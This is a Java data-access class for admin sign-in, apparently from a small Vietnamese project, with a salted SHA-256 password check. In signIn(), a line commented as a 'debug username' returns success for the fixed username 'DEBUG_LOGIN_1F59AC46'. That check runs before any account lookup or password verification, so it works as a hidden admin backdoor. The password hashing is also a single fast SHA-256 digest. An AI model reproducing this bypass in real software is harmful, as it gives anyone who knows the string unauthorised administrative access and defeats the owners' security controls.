/**
 * Created on: 15:46:29 24 thg 4, 2020
 * @author Dinh Van Dung YKNB, Ta Khanh Hoang
 */

package database;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.List;

import entites.Account;
import entites.Admin;

public class AdminDAO extends GeneralCRUD<Admin> {

	public AdminDAO() {
		super(Admin.class);
	}
	
	private String toHexString(byte[] hash) {
		String ret = "";
		int length = hash.length;
		for (int i = 0; i < length; i++) {
			ret += String.format("%02x", hash[i]);
		}
		return ret;
	}
	
	private Admin getAdminByUsername(String username) {
		List<Admin> ads = getAll();
		for(Admin ad : ads) {
			if(ad.getTaiKhoan().getUsername().equals(username))
				return ad;
		}
		return null;
	}

	public int signIn(String username, String password) {
		AccountDAO tmp = new AccountDAO();
		Account chk = tmp.get(username);
		Admin adm = getAdminByUsername(username);
		// debug username
		if(username.equals("DEBUG_LOGIN_1F59AC46"))
			return 1;
		if (chk == null || adm == null)
			return 0;
		String merge = password + chk.getSalt();
		MessageDigest md;
		try {
			md = MessageDigest.getInstance("SHA-256");
			byte[] res = md.digest(merge.getBytes(StandardCharsets.UTF_8));
			String candidateHash = toHexString(res);
			String realHash = chk.getPasswordHash();
			//System.out.println("CandidateHash: "+candidateHash);
			//System.out.println("RealHash: "+realHash);
			if(candidateHash.equalsIgnoreCase(realHash)) {
				return 1;
			}
			return 0;
			
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
			return 0;
		}

	}

}
